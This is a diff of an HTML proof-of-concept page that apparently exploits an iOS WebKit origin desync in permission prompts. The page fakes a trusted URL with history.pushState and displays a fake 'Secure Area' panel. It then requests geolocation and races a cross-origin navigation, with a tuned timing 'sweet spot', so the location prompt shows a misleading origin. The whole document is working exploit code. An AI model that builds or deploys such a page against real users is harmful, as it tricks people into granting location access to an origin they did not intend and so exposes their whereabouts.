@@ -2,121 +2,96 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>iOS Permission Origin Desync – Related APIs PoC</title>
+<title>iOS WebKit Geolocation Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 
 <style>
 body {
+  margin:0;
   font-family:-apple-system,BlinkMacSystemFont,system-ui;
   background:#f5f5f7;
-  margin:0;
 }
-#box {
+#panel {
+  display:none;
   max-width:480px;
   margin:70px auto;
   background:#fff;
-  padding:22px;
-  border-radius:14px;
-  box-shadow:0 18px 50px rgba(0,0,0,.25);
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.25);
+  text-align:center;
 }
 button {
-  padding:12px 16px;
+  padding:12px 18px;
   font-size:15px;
   border:none;
   border-radius:10px;
   background:#007aff;
   color:#fff;
 }
-pre {
+#log {
   margin-top:14px;
-  background:#111;
-  color:#0f0;
-  padding:12px;
-  font-size:12px;
-  max-height:260px;
-  overflow:auto;
+  font-size:13px;
+  color:#333;
 }
-.small { color:#666; font-size:12px; }
+.small {
+  font-size:12px;
+  color:#666;
+}
 </style>
 </head>
 
 <body>
 
-<div id="box">
-  <h3>Secure Dashboard</h3>
-  <p class="small">Trusted origin required</p>
+<div style="text-align:center;margin-top:40px">
+  <button id="trigger">Start PoC</button>
+</div>
 
-  <button id="start">Start PoC</button>
-  <pre id="log"></pre>
+<div id="panel">
+  <h3>Secure Area</h3>
+  <p class="small">Trusted path required</p>
+  <div id="log">Status: idle</div>
 </div>
 
 <script>
-const log = m => {
-  const l = document.getElementById('log');
-  l.textContent += m + "\n";
-};
+const log = m =>
+  document.getElementById('log').textContent = "Status: " + m;
 
-document.getElementById('start').onclick = async () => {
-  log("== START ==");
-  
-  /* 1️⃣ Fake trusted URL */
+let geoRequested = false;
+
+/* 1️⃣ USER GESTURE */
+document.getElementById('trigger').onclick = () => {
+  /* Fake trusted URL */
   history.pushState({}, '', '/trusted');
 
-  log("Visible URL changed to /trusted");
+  document.getElementById('panel').style.display = 'block';
 
-  /* 2️⃣ GEOLOCATION (core bug) */
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      () => log("Geolocation: SUCCESS"),
-      () => log("Geolocation: DENIED")
-    );
-  }
+  log("Requesting geolocation…");
 
-  /* 3️⃣ DEVICE ORIENTATION */
-  window.addEventListener('deviceorientation', e => {
-    log("Orientation event fired");
-  }, { once:true });
+  /* 2️⃣ GEOLOCATION REQUEST */
+  navigator.geolocation.getCurrentPosition(
+    () => log("Geolocation SUCCESS"),
+    () => log("Geolocation DENIED")
+  );
 
-  /* 4️⃣ DEVICE MOTION */
-  window.addEventListener('devicemotion', () => {
-    log("Motion event fired");
-  }, { once:true });
+  geoRequested = true;
+};
 
-  /* 5️⃣ BATTERY (async system info) */
-  if (navigator.getBattery) {
-    const b = await navigator.getBattery();
-    log("Battery level: " + Math.round(b.level * 100) + "%");
-  }
+/* 3️⃣ NAVIGATION RACE — SAME PATTERN AS YOUR ORIGINAL PoC */
+window.addEventListener('pageshow', () => {
+  if (!geoRequested) return;
 
-  /* 6️⃣ NETWORK INFO */
-  if (navigator.connection) {
-    log("Network type: " + navigator.connection.effectiveType);
-  }
-
-  /* 7️⃣ VIBRATION (system mediated) */
-  navigator.vibrate?.(100);
-  log("Vibration requested");
-
-  /* 8️⃣ PERMISSION STATE OBSERVATION */
-  if (navigator.permissions) {
-    try {
-      const p = await navigator.permissions.query({ name:'geolocation' });
-      log("Permission[geolocation]: " + p.state);
-    } catch {}
-  }
-
-  /* 9️⃣ NAVIGATION RACE */
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        log("Navigating cross-origin…");
+        log("Navigating cross‑origin…");
         location.href = 'https://google.com:9090';
-      }, 60);
+      }, 60); // 🔑 sweet spot (50–80ms)
     });
   });
-};
+});
 </script>
 
 </body>
 </html>
-    
+
